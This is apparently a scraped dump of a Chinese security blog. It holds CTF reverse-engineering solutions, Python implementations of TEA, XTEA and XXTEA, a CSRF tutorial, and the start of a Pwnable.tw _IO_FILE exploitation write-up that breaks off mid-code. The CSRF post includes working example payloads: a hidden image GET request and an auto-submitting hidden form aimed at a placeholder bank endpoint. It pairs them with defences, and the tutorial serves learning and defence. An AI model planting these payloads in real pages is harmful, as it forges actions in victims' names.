Intel 80386, for MS Windows main 函数看到有一个密码： 1234567891011121314151617181920212223242526272829int __cdecl main(int argc, const char **argv, const char **envp)&#123; signed int i; // edi char password; // [esp+10h] [ebp-104h] char Dst; // [esp+11h] [ebp-103h] password = 0; memset(&amp;Dst, 0, 0xFFu); printf(\"please input ns-ctf password: \"); scanf_s(\"%s\", &amp;password); for ( i = 1; strncmp(\"nsF0cuS!x01\", &amp;password, 0xBu); ++i ) &#123; printf(\"try again!\\n\"); memset(&amp;password, 0, 0x100u); printf(\"please input ns-ctf password: \"); scanf_s(\"%s\", &amp;password); &#125; dword_403368 = 1; if ( &amp;password + strlen(&amp;password) + 1 != &amp;Dst ) &#123; if ( i &gt; 3 ) &#123; func(); return 0; &#125; printf(\"flag:&#123;NSCTF_md5065ca&gt;01??ab7e0f4&gt;&gt;a701c&gt;cd17340&#125;\"); &#125; return 0;&#125; 发现和前一题一模一样： 12345678910111213141516171819202122int func()&#123; char *v0; // eax char Format; // [esp+0h] [ebp-38h] char Dst; // [esp+1h] [ebp-37h] char v4; // [esp+Fh] [ebp-29h] Format = 0; memset(&amp;Dst, 0, 0x30u); strncpy_s(&amp;Format, 0x31u, \"flag:&#123;NSCTF_md5065ca&gt;01??ab7e0f4&gt;&gt;a701c&gt;cd17340&#125;\", 0x30u); v0 = &amp;v4; if ( v4 != 125 ) &#123; do &#123; *v0 ^= 7u; ++v0; &#125; while ( *v0 != 125 ); &#125; return printf(&amp;Format);&#125; 异或一下： 123456#!/usr/bin/env pythonenc = '065ca&gt;01??ab7e0f4&gt;&gt;a701c&gt;cd17340'flag = ''for i in range(len(enc)): flag += chr(ord(enc[i]) ^ 7)print flag 第五题12$ file 5.exe5.exe: PE32 executable (console) Intel 80386, for MS Windows 用 OD 搜索字符串，定位关键函数： 在 IDA 里找到函数： 123456789void __cdecl sub_401000()&#123; int i; // [esp+0h] [ebp-18h] char v1[20]; // [esp+4h] [ebp-14h] for ( i = 0; i &lt; 19; ++i ) v1[i] = off_409030[47 * i % 100]; sub_401129((int)&amp;unk_4092CC, i);&#125; 正向实现一下就行了： 123456#!/usr/bin/env pythontable = [0x28, 0x2A, 0x26, 0x54, 0x49, 0x4F, 0x75, 0x68, 0x33, 0x6C, 0x31, 0x6A, 0x34, 0x68, 0x73, 0x64, 0x38, 0x37, 0x76, 0x67, 0x68, 0x28, 0x26, 0x25, 0x59, 0x47, 0x6B, 0x6A, 0x62, 0x76, 0x62, 0x61, 0x6C, 0x64, 0x6B, 0x66, 0x68, 0x5E, 0x26, 0x25, 0x2A, 0x26, 0x5E, 0x52, 0x31, 0x32, 0x6A, 0x33, 0x62, 0x65, 0x61, 0x73, 0x6F, 0x69, 0x64, 0x68, 0x63, 0x66, 0x39, 0x48, 0x43, 0x4C, 0x4B, 0x48, 0x56, 0x28, 0x2A, 0x47, 0x48, 0x44, 0x66, 0x68, 0x62, 0x6F, 0x71, 0x69, 0x77, 0x75, 0x65, 0x66, 0x38, 0x39, 0x32, 0x71, 0x33, 0x37, 0x78, 0x63, 0x76, 0x3B, 0x6C, 0x6B, 0x6A, 0x68, 0x71, 0x61, 0x73, 0x64, 0x6C, 0x6B, 0x66, 0x6A, 0x3B, 0x6C, 0x6B, 0x63, 0x6A, 0x76, 0x3B, 0x6C, 0x4C, 0x4B, 0x48, 0x61, 0x73, 0x64, 0x66, 0x6B, 0x6C, 0x6E, 0x4C, 0x4B, 0x6A, 0x68, 0x3B, 0x6C, 0x61, 0x73, 0x6B, 0x64, 0x66, 0x68, 0x6E, 0x49, 0x4F, 0x2A, 0x26, 0x59, 0x4F, 0x49, 0x55, 0x48, 0x4E, 0x6C, 0x6B, 0x69, 0x64, 0x66, 0x68, 0x76, 0x38, 0x30, 0x37, 0x39, 0x68, 0x6C, 0x6B, 0x6A, 0x42, 0x4F, 0x49, 0x55, 0x54, 0x36, 0x74, 0x66, 0x32, 0x33, 0x70, 0x30, 0x34, 0x2D, 0x30, 0x39, 0x75, 0x6A, 0x6C, 0x76, 0x3B, 0x6B, 0x6E, 0x30, 0x39, 0x38, 0x59, 0x49, 0x55, 0x68, 0x72, 0x6C, 0x6B, 0x34, 0x72, 0x6E, 0x5B, 0x70, 0x39, 0x75, 0x64, 0x76, 0x6C, 0x6B, 0x6D, 0x31, 0x70, 0x39, 0x79, 0x68, 0x38, 0x55, 0x47, 0x6B, 0x6A, 0x68, 0x70, 0x49, 0x48, 0x52, 0x50, 0x4F, 0x4E, 0x2A, 0x26, 0x5E, 0x52, 0x46, 0x43, 0x4C, 0x4B, 0x4A, 0x4E, 0x50, 0x4F, 0x49, 0x55, 0x45, 0x57, 0x44, 0x49, 0x55, 0x48, 0x33, 0x6F, 0x34, 0x69, 0x66, 0x67, 0x6F, 0x69, 0x76, 0x63, 0x33, 0x6F, 0x39, 0x38, 0x37, 0x34, 0x39, 0x26, 0x2A, 0x66, 0x6F, 0x69, 0x6A, 0x7A, 0x78, 0x62, 0x63, 0x76, 0x2A, 0x26, 0x2A, 0x26, 0x74, 0x33, 0x32, 0x31, 0x34, 0x61, 0x73, 0x64, 0x76, 0x7A, 0x78, 0x63, 0x43, 0x4C, 0x49, 0x4B, 0x4B, 0x48, 0x39, 0x38, 0x64, 0x75, 0x79, 0x66, 0x69, 0x32, 0x77, 0x6A, 0x6E, 0x65, 0x70, 0x66, 0x6F, 0x69, 0x63, 0x70, 0x69, 0x6B, 0x76, 0x70, 0x6F, 0x69, 0x73, 0x75, 0x64, 0x66, 0x2D, 0x39, 0x30, 0x38, 0x75, 0x33, 0x34, 0x72, 0x73, 0x64, 0x3B, 0x6C, 0x64, 0x66, 0x6B, 0x6E, 0x76, 0x3B, 0x6C, 0x64, 0x6B, 0x73, 0x66, 0x68, 0x76, 0x30, 0x39, 0x38, 0x79, 0x39, 0x75, 0x69, 0x68, 0x6E, 0x30, 0x34, 0x38, 0x79, 0x66, 0x70, 0x4F, 0x49, 0x55, 0x48, 0x29, 0x28, 0x38, 0x66, 0x68, 0x34, 0x32, 0x33, 0x6B, 0x6A, 0x35, 0x74, 0x68, 0x6E, 0x67, 0x6F, 0x78, 0x66, 0x63, 0x68, 0x76, 0x6A, 0x6B, 0x6E, 0x68, 0x30, 0x28, 0x2A, 0x59, 0x6F, 0x70, 0x69, 0x65, 0x72, 0x6E, 0x74, 0x30, 0x39, 0x75, 0x38, 0x32, 0x68, 0x67, 0x6B, 0x6A, 0x64, 0x66, 0x6E, 0x63, 0x76, 0x30, 0x39, 0x38, 0x59, 0x70, 0x66, 0x6F, 0x69, 0x6E, 0x32, 0x33, 0x34, 0x70, 0x66, 0x75, 0x69, 0x68, 0x39, 0x65, 0x77, 0x75, 0x69, 0x68, 0x6E, 0x72, 0x66, 0x67, 0x4B, 0x4C, 0x4A, 0x53, 0x41, 0x4F, 0x49, 0x70, 0x65, 0x75, 0x79, 0x68, 0x34, 0x75, 0x6E, 0x66, 0x67, 0x3B, 0x66, 0x6B, 0x76, 0x62, 0x30, 0x39, 0x38, 0x34, 0x33, 0x68, 0x6B, 0x6A, 0x76, 0x6E, 0x70, 0x49, 0x2A, 0x59, 0x4F, 0x49, 0x45, 0x6E, 0x72, 0x70, 0x32, 0x6F, 0x33, 0x69, 0x6A, 0x66, 0x39, 0x69, 0x6A, 0x78, 0x64, 0x63, 0x70, 0x4C, 0x49, 0x48, 0x4A, 0x2D, 0x39, 0x38, 0x66, 0x79, 0x32, 0x33, 0x6B, 0x6E, 0x66, 0x70, 0x6F, 0x73, 0x64, 0x69, 0x75, 0x76, 0x2D, 0x33, 0x39, 0x6A, 0x65, 0x66, 0x6F, 0x69, 0x6B, 0x31, 0x68, 0x72, 0x66, 0x38, 0x39, 0x75, 0x6A, 0x66, 0x64, 0x76, 0x6D, 0x6B, 0x70, 0x49, 0x75, 0x64, 0x31, 0x69, 0x6A, 0x65, 0x2D, 0x66, 0x39, 0x32, 0x4C, 0x4F, 0x49, 0x58, 0x4A, 0x48, 0x43, 0x28, 0x49, 0x6E, 0x65, 0x6D, 0x70, 0x77, 0x71, 0x6B, 0x66, 0x6E, 0x70, 0x39, 0x32, 0x33, 0x34, 0x75, 0x66, 0x2D, 0x30, 0x65, 0x69, 0x6B, 0x66, 0x31, 0x70, 0x33, 0x69, 0x6F, 0x34, 0x66, 0x6A, 0x2D, 0x39, 0x66, 0x6F, 0x76, 0x3B, 0x6C, 0x6B, 0x77, 0x71, 0x6E, 0x66, 0x64, 0x70, 0x76, 0x69, 0x4A, 0x4F, 0x53, 0x44, 0x6A, 0x66, 0x70, 0x32, 0x6F, 0x69, 0x33, 0x72, 0x6A, 0x66, 0x2D, 0x30, 0x39, 0x64, 0x66, 0x6A, 0x76, 0x3B, 0x6C, 0x6B, 0x31, 0x33, 0x6D, 0x66, 0x69, 0x6A, 0x2D, 0x31, 0x33, 0x30, 0x39, 0x34, 0x66, 0x75, 0x71, 0x77, 0x6B, 0x6C, 0x31, 0x70, 0x5B, 0x33, 0x34, 0x30, 0x39, 0x72, 0x6F, 0x63, 0x66, 0x6D, 0x76, 0x00]v3 = ''for i in range(19): v3 += chr(table[47 * i % 100])print v3 第六题12$ file 6.exe6.exe: PE32 executable (console) Intel 80386, for MS Windows 在 IDA 里硬逆就完事了： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax signed int v4; // esi signed int v5; // eax signed int v6; // ebx signed int v7; // edi signed int v8; // esi int v9; // edx int *v10; // eax char v11; // cl int *v12; // eax char v13; // cl char *v14; // eax char v15; // cl signed int v16; // esi int *v17; // edi signed int i; // esi int v20; // [esp+Ch] [ebp-ACh] signed int v21; // [esp+10h] [ebp-A8h] int *v22; // [esp+14h] [ebp-A4h] signed int v23; // [esp+18h] [ebp-A0h] int v24; // [esp+1Ch] [ebp-9Ch] int v25; // [esp+20h] [ebp-98h] int v26; // [esp+24h] [ebp-94h] int v27; // [esp+28h] [ebp-90h] int v28; // [esp+2Ch] [ebp-8Ch] int v29; // [esp+30h] [ebp-88h] int v30; // [esp+34h] [ebp-84h] int v31; // [esp+38h] [ebp-80h] int v32; // [esp+3Ch] [ebp-7Ch] int v33; // [esp+40h] [ebp-78h] int v34; // [esp+44h] [ebp-74h] int v35; // [esp+48h] [ebp-70h] int v36; // [esp+4Ch] [ebp-6Ch] int v37[3]; // [esp+50h] [ebp-68h] char v38; // [esp+5Ch] [ebp-5Ch] int v39; // [esp+68h] [ebp-50h] int v40; // [esp+6Ch] [ebp-4Ch] int v41; // [esp+70h] [ebp-48h] __int16 v42; // [esp+74h] [ebp-44h] int v43; // [esp+78h] [ebp-40h] __int16 v44; // [esp+7Ch] [ebp-3Ch] int v45; // [esp+7Eh] [ebp-3Ah] int v46; // [esp+82h] [ebp-36h] int v47; // [esp+86h] [ebp-32h] __int16 v48; // [esp+8Ah] [ebp-2Eh] int v49; // [esp+8Ch] [ebp-2Ch] char v50; // [esp+90h] [ebp-28h] int v51; // [esp+91h] [ebp-27h] int v52; // [esp+95h] [ebp-23h] int v53; // [esp+99h] [ebp-1Fh] __int16 v54; // [esp+9Dh] [ebp-1Bh] char v55; // [esp+9Fh] [ebp-19h] int v56; // [esp+A0h] [ebp-18h] __int16 v57; // [esp+A4h] [ebp-14h] int v58; // [esp+A6h] [ebp-12h] int v59; // [esp+AAh] [ebp-Eh] int v60; // [esp+AEh] [ebp-Ah] __int16 v61; // [esp+B2h] [ebp-6h] v44 = 0; v50 = 0; v49 = 6451010; v57 = 0; v56 = 1819435331; v40 = 1231382892; v43 = 2036624961; v39 = 1866884462; v45 = 0; v46 = 0; v47 = 0; v48 = 0; v51 = 0; v52 = 0; v53 = 0; v54 = 0; v55 = 0; v58 = 0; v59 = 0; v60 = 0; v61 = 0; v24 = 2; v25 = 5; v26 = 9; v27 = 6; v28 = 7; v29 = 0; v30 = 10; v31 = 8; v32 = 12; v33 = 11; v34 = 3; v35 = 4; v36 = 1; v41 = 1213493864; v42 = 101; v23 = 0; do &#123; v3 = _time64(0); srand(v23 + v3); v4 = 0; do *(&amp;v36 + ++v4) = rand() % 100; while ( v4 &lt; 3 ); v5 = 3; v21 = 3; do &#123; v6 = 1; if ( v5 &gt; 1 ) &#123; v22 = &amp;v49; v7 = 28; v8 = -12; do &#123; v9 = *(&amp;v36 + v6); v20 = v37[v6]; if ( v20 &gt; v9 ) &#123; v10 = v22; do &#123; v11 = *(_BYTE *)v10; LOBYTE(v10[v8]) = *(_BYTE *)v10; v10 = (int *)((char *)v10 + 1); &#125; while ( v11 ); v37[v6] = v9; v12 = v22 - 5; do &#123; v13 = *(_BYTE *)v12; *((_BYTE *)v12 + 20) = *(_BYTE *)v12; v12 = (int *)((char *)v12 + 1); &#125; while ( v13 ); *(&amp;v36 + v6) = v20; v14 = &amp;v38; do &#123; v15 = *v14; v14[v7] = *v14; ++v14; &#125; while ( v15 ); v5 = v21; &#125; v22 += 5; ++v6; v8 -= 5; v7 += 20; &#125; while ( v6 &lt; v5 ); &#125; v21 = --v5; &#125; while ( v5 &gt; 0 ); v16 = 0; v17 = &amp;v43; do &#123; printf(\"%s\\t%d\\n\", v17, v37[v16++]); v17 += 5; &#125; while ( v16 &lt; 3 ); if ( strcmp((const char *)&amp;v43, \"Andy\") ) break; ++v23; &#125; while ( v23 &lt; 13 ); if ( !strcmp((const char *)&amp;v43, \"Andy\") ) &#123; for ( i = 0; i &lt; v23; ++i ) printf(\"%c\", *((char *)&amp;v39 + *(&amp;v24 + i))); &#125; system(\"pause\"); return 0;&#125; 脚本： 1234567#!/usr/bin/env pythonk = [2, 5, 9, 6, 7, 0, 0xA, 8, 0xC, 0xB, 3, 4, 1]t = 'oFen'[::-1] + 'Ieil'[::-1] + 'HTrh'[::-1] + 'e'flag = ''for i in range(13): flag += t[k[i]]print flag 第七题12$ file 7.exe7.exe: PE32 executable (console) Intel 80386, for MS Windows 简单地异或一下： 1234567891011_BYTE *__cdecl sub_401000(char *a1)&#123; _BYTE *v2; // [esp+0h] [ebp-8h] signed int i; // [esp+4h] [ebp-4h] v2 = malloc(0xAu); for ( i = 0; i &lt; 9; ++i ) v2[i] = a1[i] + 2; v2[9] = 0; return v2;&#125; 脚本： 123456#!/usr/bin/env pythonenc = 'asdfghjklq'flag = ''for i in range(9): flag += chr(ord(enc[i]) + 2)print flag","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"},{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"}]},{"title":"Python实现TEA、XTEA、XXTEA加密解密算法","slug":"Python实现TEA、XTEA、XXTEA加密解密算法","date":"2019-08-22T09:00:10.000Z","updated":"2019-12-14T09:30:14.152Z","comments":true,"path":"2019/08/22/Python实现TEA、XTEA、XXTEA加密解密算法/","link":"","permalink":"blog.b3ale.cn/2019/08/22/Python实现TEA、XTEA、XXTEA加密解密算法/","excerpt":"闲来无事，喝杯茶冷静一下。","text":"闲来无事，喝杯茶冷静一下。 TEA微型加密算法（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。TEA操作处理在两个32位无符号整型上（可能源于一个64位数据），并且使用一个128位的密钥。设计者是Roger Needham和David Wheeler。 加密过程： Python 实现： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#!/usr/bin/env pythondef encrypt(v, k): v0 = v[0] v1 = v[1] x = 0 delta = 0x9E3779B9 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): x += delta x = x &amp; 0xFFFFFFFF v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vdef decrypt(v, k): v0 = v[0] v1 = v[1] x = 0xC6EF3720 delta = 0x9E3779B9 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vif __name__ == '__main__': plain = [1, 2] key = [2, 2, 3, 4] encrypted = encrypt(plain, key) print encrypted decrypted = decrypt(encrypted, key) print decrypted XTEAXTEA是TEA的升级版，增加了更多的密钥表，移位和异或操作等等。 加密过程： Python 实现： 123456789101112131415161718192021222324252627282930313233343536373839404142#!/usr/bin/env pythondef encrypt(rounds, v, k): v0 = v[0] v1 = v[1] x = 0 delta = 0x9E3779B9 for i in range(rounds): v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[x &amp; 3]) v0 = v0 &amp; 0xFFFFFFFF x += delta x = x &amp; 0xFFFFFFFF v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[(x &gt;&gt; 11) &amp; 3]) v1 = v1 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vdef decrypt(rounds, v, k): v0 = v[0] v1 = v[1] delta = 0x9E3779B9 x = delta * rounds for i in range(rounds): v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[(x &gt;&gt; 11) &amp; 3]) v1 = v1 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[x &amp; 3]) v0 = v0 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vif __name__ == '__main__': plain = [1, 2] key = [2, 2, 3, 4] rounds = 32 encrypted = encrypt(rounds, plain, key) print encrypted decrypted = decrypt(rounds, encrypted, key) print decrypted XXTEAXXTEA，又称Corrected Block TEA，是XTEA的升级版。 加密过程： Python 实现： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#!/usr/bin/env pythondef shift(z, y, x, k, p, e): return ((((z &gt;&gt; 5) ^ (y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((x ^ y) + (k[(p &amp; 3) ^ e] ^ z)))def encrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 / n x = 0 z = v[n - 1] for i in range(rounds): x = (x + delta) &amp; 0xFFFFFFFF e = (x &gt;&gt; 2) &amp; 3 for p in range(n - 1): y = v[p + 1] v[p] = (v[p] + shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF z = v[p] p += 1 y = v[0] v[n - 1] = (v[n - 1] + shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF z = v[n - 1] return vdef decrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 / n x = (rounds * delta) &amp; 0xFFFFFFFF y = v[0] for i in range(rounds): e = (x &gt;&gt; 2) &amp; 3 for p in range(n - 1, 0, -1): z = v[p - 1] v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[p] p -= 1 z = v[n - 1] v[0] = (v[0] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[0] x = (x - delta) &amp; 0xFFFFFFFF return vif __name__ == '__main__': plain = [1, 2] key = [2, 2, 3, 4] encrypted = encrypt(plain, key) print encrypted decrypted = decrypt(encrypted, key) print decrypted Referenceshttps://blog.csdn.net/gsls200808/article/details/48243019","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"blog.b3ale.cn/tags/crypto/"},{"name":"python","slug":"python","permalink":"blog.b3ale.cn/tags/python/"}]},{"title":"从零开始认识跨站请求伪造（Cross-site Request Forgery）","slug":"从零开始认识跨站请求伪造（Cross-site-Request-Forgery）","date":"2019-08-20T05:51:34.000Z","updated":"2019-08-26T05:46:11.368Z","comments":true,"path":"2019/08/20/从零开始认识跨站请求伪造（Cross-site-Request-Forgery）/","link":"","permalink":"blog.b3ale.cn/2019/08/20/从零开始认识跨站请求伪造（Cross-site-Request-Forgery）/","excerpt":"常常听到 CSRF，但不怎么了解它具体的机制，简单记录一下。","text":"常常听到 CSRF，但不怎么了解它具体的机制，简单记录一下。 What is CSRFCSRF（跨站请求伪造，Cross-site Request Forgery）也被称为One-click Attack或者Session Riding。简单的来说，就是攻击者利用受害者的身份，以受害者的名义发送恶意请求。 CSRF 这种攻击方式在 2000 年被国外的安全人员提出，但在国内，直到 2006 年才开始被关注。2008 年，国内外的多个大型社区和交互网站分别爆出 CSRF 漏洞，如：纽约时报，Metafilter，YouTube，百度等等。而现在，互联网的许多站点仍对此毫无防备，以至于安全业界称 CSRF 为“沉睡的巨人”。 首先比较一下 XSS 和 CSRF： 12345678# XSS攻击者发现XSS漏洞——构造代码——发送给受害人——受害人打开——攻击者获取受害人的cookie——完成攻击XSS容易发现，因为攻击者需要登录后台完成攻击。管理员可以看日志发现攻击者XSS的目的是获取用户的身份信息，攻击者窃取到的是用户的身份（session/cookie）# CSRF攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击CSRF的攻击一直是管理员自己实现的，攻击者只负责了构造代码CSRF是利用用户当前的身份去做一些未经过授权的操作 用一个小故事简单的介绍一下什么是 CSRF： 我们先假设支付宝存在 CSRF 漏洞，受害者的支付宝账号是alibaba，攻击者的支付宝账号是hacker 然后我们通过网页请求的方式http://zhifubao.com/withdraw?account=alibaba&amp;amount=10000&amp;for=alibaba2可以把账号alibaba的 10000 元转到另外一个账号alibaba2上去。通常情况下，该请求发送到支付宝服务器后，服务器会先验证该请求是否来自一个合法的session并且该session的用户已经成功登陆 攻击者在支付宝有账号hacker，并且他知道上文中的 URL 可以进行转账操作，于是他可以发送一个请求http://zhifubao.com/withdraw?account=alibaba&amp;amount=10000&amp;for=hacker到支付宝后台。但是这个请求是来自攻击者而不是来自alibaba，所以不能通过安全认证，因此该请求作废 这时，攻击者hacker想到了用 CSRF 的方式，他自己做了个黄色网站，在网站中放了如下代码：http://zhifubao.com/withdraw?account=alibaba&amp;amount=10000&amp;for=hacker，并且通过黄色链接诱使受害者来访问他的网站。当受害者禁不住诱惑时就会点了进去，上述请求就会从受害者的浏览器发送到支付宝，而且这个请求会附带受害者的浏览器中的cookie 大多数情况下，该请求会失败，因为支付宝会要求受害者的认证信息，但是如果刚访问支付宝不久，还没有关闭支付宝页面，浏览器中的cookie仍然存有认证信息，这个请求就会得到响应，从受害者的账户中转 10000 元到hacker账户里，而受害者丝毫不知情，攻击者拿到钱后逍遥法外 How to AttackCSRF 有两种攻击方式，一种是基于 GET 请求方式的利用，另一种是基于 POST 请求方式的利用。 Get Method12&lt;img src=&apos;https://www.xxx.com/bank.php?transferTo=hacker&apos; width=&apos;0&apos; height=&apos;0&apos; /&gt;&lt;a href=&apos;/test&apos;&gt;start&lt;/a&gt; Post Method123456&lt;iframe style=&quot;display:none&quot; name=&quot;csrf-frame&quot;&gt;&lt;/iframe&gt;&lt;form method=&apos;POST&apos; action=&apos;https://www.xxx.com/bank.php&apos; target=&quot;csrf-frame&quot; id=&quot;csrf-form&quot;&gt; &lt;input type=&apos;hidden&apos; name=&apos;id&apos; value=&apos;3&apos;&gt; &lt;input type=&apos;submit&apos; value=&apos;submit&apos;&gt;&lt;/form&gt;&lt;script&gt;document.getElementById(&quot;csrf-form&quot;).submit()&lt;/script&gt; How to Prevent防范 CSRF 攻击，其实本质就是要求网站能够识别出哪些请求是非正常用户主动发起的。这就要求我们在请求中嵌入一些额外的授权数据，让网站服务器能够区分出这些未授权的请求。 Synchronizer token pattern令牌同步模式（Synchronizer token pattern，简称 STP）是在用户请求的页面中的所有表单中嵌入一个 token，在服务端验证这个 token 的技术。token 可以是任意的内容，但是一定要保证无法被攻击者猜测到或者查询到。攻击者在请求中无法使用正确的 token，因此可以判断出未授权的请求 Cookie-to-Header Token对于使用 Js 作为主要交互技术的网站，将 CSRF 的 token 写入到 cookie 中 1Set-Cookie: CSRF-token=i8XNjC4b8KVok4uw5RftR38Wgp2BFwql; expires=Thu, 23-Jul-2015 10:25:33 GMT; Max-Age=31449600; Path=/ 然后使用 javascript 读取 token 的值，在发送 http 请求的时候将其作为请求的 header 1X-CSRF-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql 最后服务器验证请求头中的 token 是否合法 验证码使用验证码可以杜绝 CSRF 攻击，但是这种方式要求每个请求都输入一个验证码，显然没有哪个网站愿意使用这种粗暴的方式，用户体验太差，用户会疯掉的。 验证 HTTP Referer 字段根据 HTTP 协议，在 HTTP 头部中有一个 Referer 字段，它记录了该 HTTP 请求所在的地址，表示 HTTP 请求从那个页面发出的。比如当访问http://zhifubao.com/withdraw?account=lyq&amp;amount=10000&amp;for=xxx，用户必须先登录支付宝网站，然后通过点击页面的的按钮来触发转账事件。此时，转账请求的 Referer 值就是转账页面所在的 URL，通常是以zhifubao.com域名开头的地址。如果攻击者要实行 CSRF 攻击，那么他只能在自己的站点构造请求，此时 Referer 的值就指向黑客自己的网站。因此要防御 CSRF 攻击，支付宝只需要对每一个转账请求验证其 Referer 值，如果是以zhifubao.com开头的域名，则是合法请求，相反，则是非法请求并拒绝。 这种方法的好处就是简单易行，只需要在后台添加一个拦截器来检查 Referer 即可。然而这种办法并不是万无一失，Referer 的值是由浏览器提供的，一些低级的浏览器可以通过某种方式篡改 Referer 的值，这就给了攻击者可乘之机；而一些高级浏览器处于安全考虑，可以让用户设置发送 HTTP 请求时不再提供 Referer 值，这样当他们正常访问支付宝网站时，因为没有提供 Referer 值而被误认为 CERF 攻击，拒绝访问。实际应用中通常采用第二种方法来防御 CSRF 攻击。 尽量使用 POST，限制 GETGET 接口能够直接将请求地址暴露给攻击者，所以要防止 CSRF 一定最好不要用 GET。当然 POST 并不是万无一失，攻击者只需要构造一个 form 表单就可以，但需要在第三方页面做，这样就增加了暴露的可能性。 在 HTTP 头部添加自定义属性这种方法也是使用 token 并验证，但是它是把 token 放在 HTTP 请求头部中。通过使用 AJAX 我们可以在我们的请求头部中添加我们的自定义属性，但是这种方法要求我们将整个站的请求全部改成 AJAX，如果是新站还好，老站的话无疑是需要重写整个站点的，这是很不可取的。 Challenges RootMe 解题报告 [Web-Client : CSRF – 0 protection] RootMe 解题报告 [Web-Client : CSRF – token bypass] Referenceshttps://www.freebuf.com/articles/web/55965.htmlhttps://segmentfault.com/a/1190000008505616https://www.jianshu.com/p/855395f9603bhttps://juejin.im/post/5bc009996fb9a05d0a055192https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.htmlhttps://blog.techbridge.cc/2017/02/25/csrf-introduction/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"blog.b3ale.cn/tags/web/"}]},{"title":"Pwnable.tw seethefile","slug":"Pwnable-tw-seethefile","date":"2019-08-17T02:43:55.000Z","updated":"2019-08-26T05:51:33.315Z","comments":true,"path":"2019/08/17/Pwnable-tw-seethefile/","link":"","permalink":"blog.b3ale.cn/2019/08/17/Pwnable-tw-seethefile/","excerpt":"Get familiar with _IO_FILE.","text":"Get familiar with _IO_FILE. Intro关于_IO_FILE的结构体： 12345678910111213141516171819202122232425262728293031/* The tag name of this struct is _IO_FILE to preserve historic C++ mangled names for functions taking FILE* arguments. That name should not be used in new code. */struct _IO_FILE&#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */ /* The following pointers correspond to the C++ streambuf protocol. */ char *_IO_read_ptr; /* Current read pointer */ char *_IO_read_end; /* End of get area. */ char *_IO_read_base; /* Start of putback+get area. */ char *_IO_write_base; /* Start of put area. */ char *_IO_write_ptr; /* Current put pointer. */ char *_IO_write_end; /* End of put area. */ char *_IO_buf_base; /* Start of reserve area. */ char *_IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; int _flags2; __off_t _old_offset; /* This used to be _offset but it's too small. */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;; 关于vtable的结构： 1234567891011121314151617181920212223const struct _IO_jump_t _IO_file_jumps libio_vtable =&#123; JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_file_finish), JUMP_INIT(overflow, _IO_file_overflow), JUMP_INIT(underflow, _IO_file_underflow), JUMP_INIT(uflow, _IO_default_uflow), JUMP_INIT(pbackfail, _IO_default_pbackfail), JUMP_INIT(xsputn, _IO_file_xsputn), JUMP_INIT(xsgetn, _IO_file_xsgetn), JUMP_INIT(seekoff, _IO_new_file_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_new_file_setbuf), JUMP_INIT(sync, _IO_new_file_sync), JUMP_INIT(doallocate, _IO_file_doallocate), JUMP_INIT(read, _IO_file_read), JUMP_INIT(write, _IO_new_file_write), JUMP_INIT(seek, _IO_file_seek), JUMP_INIT(close, _IO_file_close), JUMP_INIT(stat, 